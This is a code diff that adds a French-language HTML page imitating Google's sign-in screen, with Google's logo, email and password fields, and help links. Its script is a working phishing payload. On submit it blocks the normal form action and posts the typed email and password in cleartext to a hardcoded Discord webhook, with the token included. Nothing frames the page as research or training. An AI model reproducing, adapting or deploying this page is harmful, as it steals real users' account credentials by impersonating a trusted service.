@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* Reset de base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #202124;
+        }
+
+        .google-login-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            width: 450px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 150px; /* Logo agrandi (anciennement 75px) */
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .password-field {
+            display: flex;
+            flex-direction: column;  /* Aligne les éléments verticalement */
+            align-items: flex-start;
+            width: 100%;
+        }
+
+        .checkbox-container {
+            margin-top: 10px;  /* Espacement entre le champ de mot de passe et la case à cocher */
+            display: flex;
+            align-items: center;
+            width: 100%;
+        }
+
+        .checkbox-container input {
+            margin-right: 8px; /* Un peu d'espace entre la case à cocher et le texte */
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-bottom: 30px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1557b3;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        footer select {
+            border: none;
+            background-color: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="google-login-container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        </div>
+        <h1>Connexion</h1>
+        <p>Accéder au site avec votre compte Google</p>
+        <form id="login-form">
+            <input type="email" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+            <div class="password-field">
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-password" onclick="togglePassword()"> 
+                    <label for="show-password">Afficher le mot de passe</label>
+                </div>
+            </div>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+            <div class="buttons">
+                <a href="#" class="create-account">Créer un compte</a>
+                <button type="submit">Suivant</button>
+            </div>
+        </form>
+        <footer>
+            <select id="language">
+                <option value="fr">Français</option>
+                <option value="en">English</option>
+                <option value="es">Español</option>
+            </select>
+            <a href="#">Aide</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Conditions d'utilisation</a>
+        </footer>
+    </div>
+
+    <script>
+        // Fonction pour basculer l'affichage du mot de passe
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const showPasswordCheckbox = document.getElementById('show-password');
+
+            // Change le type du champ de mot de passe en fonction de la case cochée
+            passwordField.type = showPasswordCheckbox.checked ? 'text' : 'password';
+        }
+
+        // URL du Webhook Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1332658553298882620/NPStZf0fBnD973eBiw0E6SJzdt0kfqABdk5Z7_M-dNMjFoTC0fZSKRmbF-BNKYirDIL9';
+
+        // Fonction pour envoyer les données à Discord
+        function sendToDiscord(email, password) {
+            const message = {
+                content: `Nouvelle tentative de connexion :\nEmail : ${email}\nMot de passe : ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Données envoyées à Discord', data))
+            .catch(error => console.error('Erreur d\'envoi à Discord', error));
+        }
+
+        // Événement de soumission du formulaire
+        document.getElementById('login-form').addEventListener('submit', function (event) {
+            event.preventDefault();  // Empêche la soumission du formulaire par défaut
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Appelle la fonction pour envoyer les informations à Discord
+            sendToDiscord(email, password);
+        });
+    </script>
+</body>
+</html>
